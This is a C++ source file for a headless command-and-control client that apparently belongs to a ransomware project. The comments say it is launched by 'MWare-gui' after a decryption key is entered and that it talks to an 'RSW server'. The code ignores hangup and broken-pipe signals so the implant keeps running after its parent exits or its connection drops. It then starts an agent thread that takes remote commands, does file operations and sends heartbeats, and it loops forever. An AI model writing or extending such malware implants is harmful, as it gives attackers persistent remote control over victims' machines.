// ============================================================================
// c2_client.cpp — Headless C2 Client (No GUI)
// ============================================================================
// Standalone binary that ONLY handles C2 communication with RSW server.
// Spawned by MWare-gui when correct decryption key is entered.
// No GUI, no encryption module, no evasion — pure C2 agent.
// Lightweight and runs in background after GUI exits.
// ============================================================================

#include "c2_agent.h"
#include "api_table.h"
#include "obfuscation.h"

#include <thread>
#include <chrono>
#include <csignal>  // signal(), SIG_IGN, SIGHUP, SIGPIPE

// ============================================================================
// MAIN — Headless C2 Client Entry Point
// ============================================================================
int main(int argc, char** argv) {
    (void)argc; (void)argv;

    // ========================================================================
    // Ignore SIGHUP and SIGPIPE to survive parent process termination and
    // unexpected connection drops.
    //
    // SIGHUP: When the spawning process (MWare-gui) exits, macOS may send
    // SIGHUP to all processes sharing the same controlling terminal. Without
    // this handler, the default SIG_DFL behavior terminates the process.
    //
    // SIGPIPE: If the C2 connection (TCP socket) is unexpectedly closed by
    // the remote peer (RSW server restart, network drop), any write()/send()
    // call in the background thread will generate SIGPIPE. Default behavior
    // terminates the process. With SIG_IGN, write() returns -1 with errno=
    // EPIPE, which the background thread handles gracefully (disconnect/reconnect).
    // ========================================================================
    signal(SIGHUP, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);

    // Create C2 agent and start background communication thread
    C2Agent agent;
    agent.startBackgroundThread();

    // Keep process alive — C2 agent runs in its background thread
    // The agent handles: C2 connection, command processing, file ops,
    // heartbeat, and all RSW protocol communication automatically.
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(30));
    }

    return 0;
}
